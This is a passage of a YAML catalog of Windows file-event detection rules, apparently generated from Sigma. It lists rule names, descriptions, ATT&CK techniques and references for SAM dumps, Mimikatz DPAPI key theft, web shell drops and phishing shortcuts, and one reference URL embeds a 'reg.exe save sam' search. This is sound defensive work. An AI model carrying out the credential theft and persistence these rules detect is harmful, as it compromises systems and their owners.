  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://github.com/kavika13/RemCom/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fec96f39-988b-4586-b746-b93d59fd1922
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_remote_access_tools_screenconnect_artefact.yml
  name: ScreenConnect Temporary Installation Artefact
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 0afecb6e-6223-4a82-99fb-bf5b981e92a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_remote_access_tools_screenconnect_remote_file.yml
  name: Remote Access Tool - ScreenConnect Temporary File
  description: 'Detects the creation of files in a specific location by ScreenConnect
    RMM.

    ScreenConnect has feature to remotely execute binaries on a target machine. These
    binaries will be dropped to ":\Users\<username>\Documents\ConnectWiseControl\Temp\"
    before execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/pull/4467
  false_positives:
  - Legitimate use of ScreenConnect
  notes: ''
- detection_id: a6976974-ea6f-4e97-818e-ea08625c52cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_ripzip_attack.yml
  name: Potential RipZip Attack on Startup Folder
  description: 'Detects a phishing attack which expands a ZIP file containing a malicious
    shortcut.

    If the victim expands the ZIP file via the explorer process, then the explorer
    process expands the malicious ZIP file and drops a malicious shortcut redirected
    to a backdoor into the Startup folder.

    Additionally, the file name of the malicious shortcut in Startup folder contains
    {0AFACED1-E828-11D1-9187-B532F1E9575D} meaning the folder shortcut operation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547
  time_window: ''
  references:
  - https://twitter.com/jonasLyk/status/1549338335243534336?t=CrmPocBGLbDyE4p6zTX1cg&s=19
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4e87b8e2-2ee9-4b2a-a715-4727d297ece0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sam_dump.yml
  name: Potential SAM Database Dump
  description: Detects the creation of files that look like exports of the local SAM
    (Security Account Manager)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://github.com/search?q=CVE-2021-36934
  - https://web.archive.org/web/20210725081645/https://github.com/cube0x0/CVE-2021-36934
  - https://www.google.com/search?q=%22reg.exe+save%22+sam
  - https://github.com/HuskyHacks/ShadowSteal
  - https://github.com/FireFart/hivenightmare
  false_positives:
  - Rare cases of administrative activity
  notes: ''
- detection_id: 760e75d8-c3b5-409b-a9bf-6130b4c4603f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sed_file_creation.yml
  name: Self Extraction Directive File Created In Potentially Suspicious Location
  description: 'Detects the creation of Self Extraction Directive files (.sed) in
    a potentially suspicious location.

    These files are used by the "iexpress.exe" utility in order to create self extracting
    packages.

    Attackers were seen abusing this utility and creating PE files with embedded ".sed"
    entries.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://strontic.github.io/xcyclopedia/library/iexpress.exe-D594B2A33EFAFD0EABF09E3FDC05FCEA.html
  - https://en.wikipedia.org/wiki/IExpress
  - https://www.virustotal.com/gui/file/602f4ae507fa8de57ada079adff25a6c2a899bd25cd092d0af7e62cdb619c93c/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1277f594-a7d1-4f28-a2d3-73af5cbeab43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_shell_write_susp_directory.yml
  name: Windows Shell/Scripting Application File Write to Suspicious Folder
  description: Detects Windows shells and scripting applications that write files
    to suspicious folders
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: b8fd0e93-ff58-4cbd-8f48-1c114e342e62
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_shell_write_susp_files_extensions.yml
  name: Windows Binaries Write Suspicious Extensions
  description: Detects Windows executables that write files with suspicious extensions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2aa0a6b4-a865-495b-ab51-c28249537b75
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_startup_folder_file_write.yml
  name: Startup Folder File Write
  description: A General detection for files being created in the Windows startup
    directory. This could be an indicator of persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/12
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/5.B.1_611FCA99-97D0-4873-9E51-1C1BA2DBB40D.md
  false_positives:
  - FP could be caused by legitimate application writing shortcuts for example. This
    folder should always be inspected to make sure that all the files in there are
    legitimate
  notes: ''
- detection_id: e15b518d-b4ce-4410-a9cd-501f23ce4a18
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_colorcpl.yml
  name: Suspicious Creation with Colorcpl
  description: Once executed, colorcpl.exe will copy the arbitrary file to c:\windows\system32\spool\drivers\color\
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1564
  tags:
  - attack.defense-evasion
  - attack.t1564
  time_window: ''
  references:
  - https://twitter.com/eral4m/status/1480468728324231172?s=20
  false_positives:
  - Unknown
  notes: ''
- detection_id: 409f8a98-4496-4aaa-818a-c931c0a8b832
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_creation_by_mobsync.yml
  name: Created Files by Microsoft Sync Center
  description: This rule detects suspicious files created by Microsoft Sync Center
    (mobsync)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1055
  - T1218
  tags:
  - attack.privilege-escalation
  - attack.t1055
  - attack.t1218
  - attack.execution
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-november-2021/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5f87308a-0a5b-4623-ae15-d8fa1809bc60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_default_gpo_dir_write.yml
  name: Suspicious Files in Default GPO Folder
  description: Detects the creation of copy of suspicious files (EXE/DLL) to the default
    GPO storage folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.t1036.005
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-november-2021/
  false_positives:
  - Unknown
  notes: ''
- detection_id: caf02a0a-1e1c-4552-9b48-5e070bd88d11
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_desktop_txt.yml
  name: Suspicious Creation TXT File in User Desktop
  description: Ransomware create txt file in the user Desktop
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1486/T1486.md#atomic-test-5---purelocker-ransom-note
  false_positives:
  - Unknown
  notes: ''
- detection_id: fc4f4817-0c53-4683-a4ee-b17a64bc1039
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
  name: Suspicious Desktopimgdownldr Target File
  description: Detects a suspicious Microsoft desktopimgdownldr file creation that
    stores a file to a suspicious location or contains a file with a suspicious extension
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
  - https://twitter.com/SBousseaden/status/1278977301745741825
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: 3d0ed417-3d94-4963-a562-4a92c940656a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_diagcab.yml
  name: Creation of a Diagcab
  description: Detects the creation of diagcab file, which could be caused by some
    legitimate installer or is a sign of exploitation (review the filename and its
    location)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.resource-development
  time_window: ''
  references:
  - https://threadreaderapp.com/thread/1533879688141086720.html
  false_positives:
  - Legitimate microsoft diagcab
  notes: ''
- detection_id: b4926b47-a9d7-434c-b3a0-adc3fa0bd13e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_double_extension.yml
  name: Suspicious Double Extension Files
  description: Detects dropped files with double extensions, which is often used by
    malware as a method to abuse the fact that Windows hide default extensions by
    default.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036.007
  tags:
  - attack.defense-evasion
  - attack.t1036.007
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/
  - https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations
  - https://www.cybereason.com/blog/research/a-bazar-of-tricks-following-team9s-development-cycles
  - https://twitter.com/malwrhunterteam/status/1235135745611960321
  - https://twitter.com/luc4m/status/1073181154126254080
  - https://cloud.google.com/blog/topics/threat-intelligence/cybercriminals-weaponize-fake-ai-websites
  - https://vipre.com/blog/svg-phishing-attacks-the-new-trick-in-the-cybercriminals-playbook/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7892ec59-c5bb-496d-8968-e5d210ca3ac4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_dpapi_backup_and_cert_export_ioc.yml
  name: DPAPI Backup Keys And Certificate Export Activity IOC
  description: 'Detects file names with specific patterns seen generated and used
    by tools such as Mimikatz and DSInternals related to exported or stolen DPAPI
    backup keys and certificates.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1552.004
  - T1555
  tags:
  - attack.credential-access
  - attack.t1555
  - attack.t1552.004
  time_window: ''
  references:
  - https://www.dsinternals.com/en/dpapi-backup-key-theft-auditing/
  - https://github.com/MichaelGrafnetter/DSInternals/blob/39ee8a69bbdc1cfd12c9afdd7513b4788c4895d4/Src/DSInternals.Common/Data/DPAPI/DPAPIBackupKey.cs#L28-L32
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7280c9f3-a5af-45d0-916a-bc01cb4151c9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_exchange_aspx_write.yml
  name: Suspicious MSExchangeMailboxReplication ASPX Write
  description: Detects suspicious activity in which the MSExchangeMailboxReplication
    process writes .asp and .apsx files to disk, which could be a sign of ProxyShell
    exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://redcanary.com/blog/blackbyte-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 74babdd6-a758-4549-9632-26535279e654
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_executable_creation.yml
  name: Suspicious Executable File Creation
  description: 'Detect creation of suspicious executable file names.

    Some strings look for suspicious file extensions, others look for filenames that
    exploit unquoted service paths.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1564
  tags:
  - attack.defense-evasion
  - attack.t1564
  time_window: ''
  references:
  - https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
  - https://app.any.run/tasks/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 89c42960-f244-4dad-9151-ae9b1a3287a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_file_write_in_webapps_root.yml
  name: Suspicious File Write to Webapps Root Directory
  description: 'Detects suspicious file writes to the root directory of web applications,
    particularly Apache web servers or Tomcat servers.

    This may indicate an attempt to deploy malicious files such as web shells or other
    unauthorized scripts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1f0489be-b496-4ddf-b3a9-5900f2044e9c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_filewrite_in_sharepoint_layouts_dir.yml
  name: Suspicious File Write to SharePoint Layouts Directory
  description: 'Detects suspicious file writes to SharePoint layouts directory which
    could indicate webshell activity or post-exploitation.

    This behavior has been observed in the exploitation of SharePoint vulnerabilities
    such as CVE-2025-49704, CVE-2025-49706 or CVE-2025-53770.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/
  - https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0c3fac91-5627-46e8-a6a8-a0d7b9b8ae1b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_get_variable.yml
  name: Suspicious Get-Variable.exe Creation
  description: 'Get-Variable is a valid PowerShell cmdlet

    WindowsApps is by default in the path where PowerShell is executed.

    So when the Get-Variable command is issued on PowerShell execution, the system
    first looks for the Get-Variable executable in the path and executes the malicious
    binary instead of looking for the PowerShell cmdlet.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1027
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/
  - https://www.joesandbox.com/analysis/465533/0/html
  false_positives:
  - Unknown
  notes: ''
- detection_id: a8f866e1-bdd4-425e-a27a-37619238d9c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_hidden_dir_index_allocation.yml
  name: Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream
  description: 'Detects the creation of hidden file/folder with the "::$index_allocation"
    stream. Which can be used as a technique to prevent access to folder and files
    from tooling such as "explorer.exe" and "powershell.exe"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://twitter.com/pfiatde/status/1681977680688738305
  - https://soroush.me/blog/2010/12/a-dotty-salty-directory-a-secret-place-in-ntfs-for-secret-files/
  - https://sec-consult.com/blog/detail/pentesters-windows-ntfs-tricks-collection/
  - https://github.com/redcanaryco/atomic-red-team/blob/5c3b23002d2bbede3c07e7307165fc2a235a427d/atomics/T1564.004/T1564.004.md#atomic-test-5---create-hidden-directory-via-index_allocation
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4f1707b1-b50b-45b4-b5a2-3978b5a5d0d6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_homoglyph_filename.yml
  name: Potential Homoglyph Attack Using Lookalike Characters in Filename
  description: 'Detects the presence of unicode characters which are homoglyphs, or
    identical in appearance, to ASCII letter characters.

    This is used as an obfuscation and masquerading techniques. Only "perfect" homoglyphs
    are included; these are characters that

    are indistinguishable from ASCII characters and thus may make excellent candidates
    for homoglyph attack characters.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1036.003
  time_window: ''
  references:
  - https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish
  - http://www.irongeek.com/homoglyph-attack-generator.php
  false_positives:
  - File names with legitimate Cyrillic text. Will likely require tuning (or not be
    usable) in countries where these alphabets are in use.
  notes: ''
- detection_id: 654fcc6d-840d-4844-9b07-2c3300e54a26
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_archive.yml
  name: Legitimate Application Dropped Archive
  description: Detects programs on a Windows system that should not write an archive
    to disk
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/Neo23x0/sysmon-config/blob/3f808d9c022c507aae21a9346afba4a59dd533b9/sysmonconfig-export-block.xml#L1326
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0540f7e-2db3-4432-b9e0-3965486744bc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_exe.yml
  name: Legitimate Application Dropped Executable
  description: Detects programs on a Windows system that should not write executables
    to disk
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/Neo23x0/sysmon-config/blob/3f808d9c022c507aae21a9346afba4a59dd533b9/sysmonconfig-export-block.xml#L1326
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7d604714-e071-49ff-8726-edeb95a70679
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_script.yml
  name: Legitimate Application Dropped Script
  description: Detects programs on a Windows system that should not write scripts
    to disk
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/Neo23x0/sysmon-config/blob/3f808d9c022c507aae21a9346afba4a59dd533b9/sysmonconfig-export-block.xml#L1326
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3215aa19-f060-4332-86d5-5602511f3ca8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_lnk_double_extension.yml
  name: Suspicious LNK Double Extension File Created
  description: 'Detects the creation of files with an "LNK" as a second extension.
    This is sometimes used by malware as a method to abuse the fact that Windows hides
    the "LNK" extension by default.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036.007
  tags:
  - attack.defense-evasion
  - attack.t1036.007
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/
  - https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations
  - https://www.cybereason.com/blog/research/a-bazar-of-tricks-following-team9s-development-cycles
  - https://twitter.com/malwrhunterteam/status/1235135745611960321
  - https://twitter.com/luc4m/status/1073181154126254080
  false_positives:
  - Some tuning is required for other general purpose directories of third party apps
  notes: ''
- detection_id: b5b78988-486d-4a80-b991-930eff3ff8bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_powershell_profile.yml
  name: PowerShell Profile Modification
  description: Detects the creation or modification of a powershell profile which
    could indicate suspicious activity as the profile can be used as a mean of persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.013
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.013
  time_window: ''
  references:
  - https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
  - https://persistence-info.github.io/Data/powershellprofile.html
  false_positives:
  - System administrator creating Powershell profile manually
  notes: ''
- detection_id: 3da70954-0f2c-4103-adff-b7440368f50e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_procexplorer_driver_created_in_tmp_folder.yml
  name: Suspicious PROCEXP152.sys File Created In TMP
  description: 'Detects the creation of the PROCEXP152.sys file in the application-data
    local temporary folder.

    This driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU)
    or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses
    KDU.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.t1562.001
  - attack.defense-evasion
  time_window: ''
  references:
  - https://web.archive.org/web/20230331181619/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/
  false_positives:
  - Other legimate tools using this driver and filename (like Sysinternals). Note
    - Clever attackers may easily bypass this detection by just renaming the driver
    filename. Therefore just Medium-level and don't rely on it.
  notes: ''
- detection_id: b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_public_folder_extension.yml
  name: Suspicious Binaries and Scripts in Public Folder
  description: Detects the creation of a file with a suspicious extension in the public
    folder, which could indicate potential malicious activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204
  tags:
  - attack.execution
  - attack.t1204
  time_window: ''
  references:
  - https://intel.thedfirreport.com/events/view/30032
  - https://intel.thedfirreport.com/eventReports/view/70
  - https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/
  false_positives:
  - Administrators deploying legitimate binaries to public folders.
  notes: ''
- detection_id: cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_recycle_bin_fake_exec.yml
  name: Suspicious File Creation Activity From Fake Recycle.Bin Folder
